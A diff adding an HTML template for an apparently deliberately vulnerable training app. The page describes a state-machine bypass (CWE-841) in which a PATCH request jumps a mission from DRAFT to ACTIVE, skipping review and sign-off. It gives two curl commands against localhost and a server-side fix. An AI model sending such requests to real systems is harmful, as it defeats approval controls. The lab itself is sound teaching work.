@@ -1,0 +1,60 @@
+{% extends 'base.html' %}
+{% block title %}Mission Ops — State Machine{% endblock %}
+{% block content %}
+<div class="panel">
+  <div class="panel-head">
+    <span class="badge p2">P2</span>
+    <h2>Mission Operations — State Machine Bypass</h2>
+    <p class="mono-dim">CWE-841 · DRAFT→ACTIVE in one PATCH · Transition guard is frontend-only</p>
+  </div>
+  <div class="vuln-info">
+    Intended flow: <code>DRAFT → SUBMITTED → APPROVED → ACTIVE → COMPLETED</code>.
+    The API accepts any state in the PATCH body with no prior-state check — an attacker
+    jumps directly to ACTIVE, skipping peer review (SUBMITTED) and senior sign-off (APPROVED).
+  </div>
+
+  <div class="hint-box">
+    <b>Attack (curl):</b>
+    <pre class="result-block"># 1. Create a mission
+curl -X POST http://localhost:5000/mission/ops \
+     -H "Content-Type: application/json" -H "Cookie: session=&lt;your-cookie&gt;" \
+     -d '{"name":"OP-SHADOW"}'
+
+# 2. Bypass all approval steps in one call
+curl -X PATCH http://localhost:5000/mission/ops/&lt;id&gt; \
+     -H "Content-Type: application/json" -H "Cookie: session=&lt;your-cookie&gt;" \
+     -d '{"state":"ACTIVE"}'</pre>
+    <b>Remediation:</b> Enforce valid transitions server-side:
+    <code>if new_state not in VALID_TRANSITIONS[current_state]: abort(400)</code>
+  </div>
+
+  <h3>Active Missions</h3>
+  {% if missions %}
+  <table class="data-table">
+    <tr><th>ID</th><th>Name</th><th>State</th><th>Owner</th><th>History</th></tr>
+    {% for m in missions %}
+    <tr>
+      <td><code>{{ m.id }}</code></td>
+      <td>{{ m.name }}</td>
+      <td><span class="badge {{ 'p1' if m.state=='ACTIVE' else 'p2' if m.state in ['SUBMITTED','APPROVED'] else 'p3' }}">
+        {{ m.state }}</span></td>
+      <td>{{ m.owner }}</td>
+      <td class="mono-dim">{{ m.history|length }} transitions</td>
+    </tr>
+    {% endfor %}
+  </table>
+  {% else %}
+  <p class="mono-dim">No missions yet — POST to <code>/mission/ops</code> to create one.</p>
+  {% endif %}
+
+  <h3>Valid State Transitions</h3>
+  <table class="data-table">
+    {% for state, targets in state_machine.items() %}
+    <tr>
+      <td><code>{{ state }}</code></td>
+      <td>→ {% for t in targets %}<code>{{ t }}</code>{% if not loop.last %}, {% endif %}{% endfor %}</td>
+    </tr>
+    {% endfor %}
+  </table>
+</div>
+{% endblock %}
